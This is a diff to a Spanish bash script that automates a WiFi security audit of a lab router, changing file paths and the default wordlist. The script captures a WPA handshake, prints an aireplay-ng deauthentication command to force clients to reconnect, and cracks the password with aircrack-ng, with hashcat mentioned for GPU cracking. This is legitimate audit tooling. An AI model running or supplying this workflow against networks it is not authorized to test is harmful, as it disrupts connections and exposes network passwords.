@@ -7,9 +7,10 @@
 #  Este script esta pensado para un router de laboratorio que TU controlas.
 # =============================================================================================
 #  Requiere: Kali/Debian con la suite aircrack-ng y un adaptador WiFi con modo monitor+inyeccion.
-#  Ejecuta:  sudo ./auditar-wifi.sh
+#  Ejecuta:  sudo ./auditar-wifi.sh     (o simplemente:  ./arrancar.sh)
 # =============================================================================================
 set -euo pipefail
+DIR_SCRIPT="$(cd "$(dirname "$0")" && pwd)"
 
 rojo=$'\e[31m'; verde=$'\e[32m'; amar=$'\e[33m'; azul=$'\e[36m'; fin=$'\e[0m'
 info(){ echo "${azul}==>${fin} $*"; }
@@ -71,7 +72,7 @@ limpiar(){
 trap limpiar EXIT
 
 # ---- 5. escaneo ----
-carpeta="captura_lab"
+carpeta="${DIR_SCRIPT}/captura_lab"
 mkdir -p "$carpeta"; cd "$carpeta"
 aviso "Se abrira el escaner. Localiza TU red, anota su BSSID y CANAL (CH), y pulsa Ctrl-C."
 read -rp "Enter para escanear..." _
@@ -88,8 +89,8 @@ info "Voy a capturar en el canal $canal. Deja ESTA ventana abierta."
 aviso "Arriba a la derecha veras 'WPA handshake: $bssid' cuando lo consigas."
 aviso "Para forzarlo (contra un dispositivo TUYO ya conectado), en OTRA terminal:"
 echo   "      sudo aireplay-ng --deauth 5 -a $bssid $mon"
-echo   "      (--deauth 5 = 5 paquetes; expulsa brevemente al equipo y este se reconecta,"
-echo   "       generando el handshake. No uses numeros altos: solo necesitas la reconexion.)"
+echo   "      (--deauth 5 = 5 paquetes; expulsa al equipo un instante y al reconectarse"
+echo   "       genera el handshake. No uses numeros altos: solo necesitas la reconexion.)"
 read -rp "Enter para empezar (Ctrl-C en cuanto veas el handshake)..." _
 airodump-ng --bssid "$bssid" -c "$canal" -w "$base" "$mon" || true
 
@@ -106,16 +107,21 @@ fi
 
 # ---- 8. crackeo (CPU con aircrack-ng) ----
 echo
-dicc_def="/usr/share/wordlists/rockyou.txt"
-if [[ -f "${dicc_def}.gz" && ! -f "$dicc_def" ]]; then
-  info "Descomprimiendo rockyou.txt..."
-  gunzip -k "${dicc_def}.gz" || true
+# Diccionario por defecto: el de laboratorio que viene en el repo, junto al script.
+dicc_def="${DIR_SCRIPT}/diccionario-lab.txt"
+if [[ ! -f "$dicc_def" ]]; then
+  dicc_def="/usr/share/wordlists/rockyou.txt"
+  if [[ -f "${dicc_def}.gz" && ! -f "$dicc_def" ]]; then
+    info "Descomprimiendo rockyou.txt..."
+    gunzip -k "${dicc_def}.gz" || true
+  fi
 fi
+aviso "Por defecto uso el diccionario de laboratorio: pulsa Enter. Para otro, escribe su ruta."
 read -rp "Diccionario a usar [$dicc_def]: " dicc
 dicc=${dicc:-$dicc_def}
 [[ -f "$dicc" ]] || { error "No existe el diccionario: $dicc"; exit 1; }
 
-info "Crackeando con aircrack-ng (CPU). Para GPU (mucho mas rapido) mira el LEEME: hashcat modo 22000."
+info "Crackeando con aircrack-ng (CPU). Para GPU (mas rapido) mira el LEEME: hashcat modo 22000."
 aircrack-ng -w "$dicc" -b "$bssid" "$cap" || true
 
 echo
